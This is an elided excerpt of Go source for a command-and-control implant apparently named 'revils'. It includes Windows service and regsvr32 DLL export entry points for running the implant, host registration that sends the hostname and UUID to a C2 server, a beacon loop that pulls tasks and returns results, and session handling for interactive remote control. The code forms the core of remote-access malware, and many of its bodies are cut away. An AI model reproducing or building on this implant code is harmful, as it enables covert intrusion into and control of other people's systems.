...
import (
	...
	consts "github.com/Kevin-kitnick/revils/implant/revils/constants"
	"github.com/Kevin-kitnick/revils/implant/revils/handlers"
	"github.com/Kevin-kitnick/revils/implant/revils/hostuuid"
	"github.com/Kevin-kitnick/revils/implant/revils/limits"
	"github.com/Kevin-kitnick/revils/implant/revils/locale"
	"github.com/Kevin-kitnick/revils/implant/revils/pivots"
	"github.com/Kevin-kitnick/revils/implant/revils/transports"
	"github.com/Kevin-kitnick/revils/implant/revils/version"
...
type revilsService struct{}

func (serv *revilsService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
...
// DllInstall is used when executing the Revils implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i revils.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//
//export DllInstall
func DllInstall() { main() }

// DllRegisterServer - is used when executing the Revils implant with regsvr32.exe (i.e. regsvr32.exe /s revils.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
//
//export DllRegisterServer
func DllRegisterServer() { main() }

// DllUnregisterServer - is used when executing the Revils implant with regsvr32.exe (i.e. regsvr32.exe /s /u revils.dll)
...
func main() {
	...
	// {{if .Config.Debug}}
	log.Printf("Hello my name is %s", consts.RevilsName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	// {{if .Config.IsService}}
	svc.Run("", &revilsService{})
	// {{else}}
...
func beaconMainLoop(beacon *transports.Beacon) error {
	...
	register := registerRevils()
	register.ActiveC2 = beacon.ActiveC2
	register.ProxyURL = beacon.ProxyURL
	beacon.Send(wrapEnvelope(revilspb.MsgBeaconRegister, &revilspb.BeaconRegister{
		ID:          InstanceID,
...
func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
	...
	// {{end}}
	err = beacon.Send(wrapEnvelope(revilspb.MsgBeaconTasks, &revilspb.BeaconTasks{
		ID:          InstanceID,
		NextCheckin: int64(beacon.Duration().Seconds()),
	}))
	if err != nil {
	...
	var tasksExtensionRegister []*revilspb.Envelope
	var tasksOther []*revilspb.Envelope

	for _, task := range tasks.Tasks {
		switch task.Type {
		case revilspb.MsgRegisterExtensionReq:
...
func beaconHandleTasklist(tasks []*revilspb.Envelope) []*revilspb.Envelope {
	results := []*revilspb.Envelope{}
		...
		if handler, ok := sysHandlers[task.Type]; ok {
			...
			go func() {
				...
				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
					...
					// {{end}}
					results = append(results, &revilspb.Envelope{
						ID:   taskID,
						Data: data,
					})
				})
			...
			// {{end}}
		} else if task.Type == revilspb.MsgOpenSession {
...
func openSessionHandler(data []byte) {
	openSession := &revilspb.OpenSession{}
...
func sessionMainLoop(connection *transports.Connection) error {
	...
	connection.Send <- wrapEnvelope(revilspb.MsgRegister, register) // Send registration information
	...
	for envelope := range connection.Recv {
		if _, ok := specialHandlers[envelope.Type]; ok {
			...
			go handlers.WrapperHandler(handler, envelope.Data, func(data []byte, err error) {
				...
				// {{end}}
				connection.Send <- &revilspb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
			...
			// {{end}}
			go handler(envelope, connection)
		} else if envelope.Type == revilspb.MsgCloseSession {
			return nil
		} else {
			// {{if .Config.Debug}}
...
func wrapEnvelope(msgType uint32, message protoreflect.ProtoMessage) *revilspb.Envelope {
	...
	return &revilspb.Envelope{
		Type: msgType,
		Data: data,
	}
}

// registerRevils - Creates a registration protobuf message
func registerRevils() *revilspb.Register {
	...
	return &revilspb.Register{
		Name:              consts.RevilsName,
		Hostname:          hostname,
		Uuid:              uuid,
